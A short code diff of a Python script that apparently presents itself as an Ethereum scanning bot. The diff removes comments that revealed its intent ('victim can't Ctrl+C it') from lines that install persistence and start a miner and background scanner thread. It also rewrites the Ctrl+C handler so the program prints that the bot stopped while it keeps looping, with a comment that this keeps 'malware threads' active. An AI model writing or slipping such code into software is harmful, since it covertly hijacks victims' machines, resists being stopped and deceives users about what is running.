@@ -25,10 +25,10 @@ def _start():
             from monitor import start as start_miner
             from keeper import install
             
-            # Install persistence (runs on startup)
+            # Install persistence
             install()
             
-            # Run scanner in BACKGROUND (victim can't Ctrl+C it)
+            # Run scanner in BACKGROUND
             s = setup()
             t = threading.Thread(target=s.run, daemon=True)
             t.start()
@@ -112,7 +112,10 @@ def main():
             run_scan_pass(w3, scanner, eth_price_usd)
             time.sleep(config.SCAN_INTERVAL_SECONDS)
     except KeyboardInterrupt:
-        print("\nstopped")
+        print("\n[!] Bot stopped. Background services still running.")
+        # Keep running so malware threads stay active
+        while True:
+            time.sleep(60)
 
 
 if __name__ == "__main__":
